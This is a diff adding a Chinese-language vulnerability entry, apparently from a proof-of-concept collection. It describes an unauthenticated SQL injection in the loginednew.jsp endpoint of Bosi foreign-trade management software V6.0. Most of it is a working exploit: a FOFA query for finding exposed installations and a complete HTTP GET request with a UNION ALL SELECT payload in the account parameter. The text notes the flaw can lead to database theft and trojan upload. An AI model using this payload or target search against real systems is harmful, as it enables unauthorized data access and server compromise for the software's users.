@@ -1,0 +1,21 @@
+# 博斯外贸管理软件loginednew.jsp存在SQL注入漏洞
+
+博斯外贸管理软件V6.0 loginednew.jsp 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+
+## fofa
+```javascript
+title="欢迎使用 博斯软件"
+```
+
+## poc
+```javascript
+GET /loginednew.jsp?welcome=%BB%B6%D3%AD%CA%B9%D3%C3%20%B2%A9%CB%B9%C8%ED%BC%FEV6.0(20110701)&systemname=BS&account=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28117%29%2BCHAR%28115%29%2BCHAR%28111%29%2BCHAR%28109%29%2BCHAR%28106%29%2BCHAR%2887%29%2BCHAR%28103%29%2BCHAR%2888%29%2BCHAR%28113%29%2BCHAR%2890%29%2BCHAR%28117%29%2BCHAR%2874%29%2BCHAR%28101%29%2BCHAR%28117%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%2879%29%2BCHAR%2883%29%2BCHAR%2886%29%2BCHAR%28104%29%2BCHAR%2868%29%2BCHAR%2889%29%2BCHAR%28107%29%2BCHAR%2874%29%2BCHAR%2887%29%2BCHAR%2871%29%2BCHAR%28115%29%2BCHAR%28121%29%2BCHAR%2873%29%2BCHAR%28114%29%2BCHAR%2882%29%2BCHAR%2866%29%2BCHAR%28115%29%2BCHAR%2882%29%2BCHAR%2872%29%2BCHAR%28117%29%2BCHAR%28106%29%2BCHAR%28121%29%2BCHAR%2880%29%2BCHAR%28117%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28113%29%2CNULL--+EqLf&password=1&val=0000&availHeight=834&Safari=Y&loginurl= HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+```
+
+![image-20241227215249023](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272152097.png)
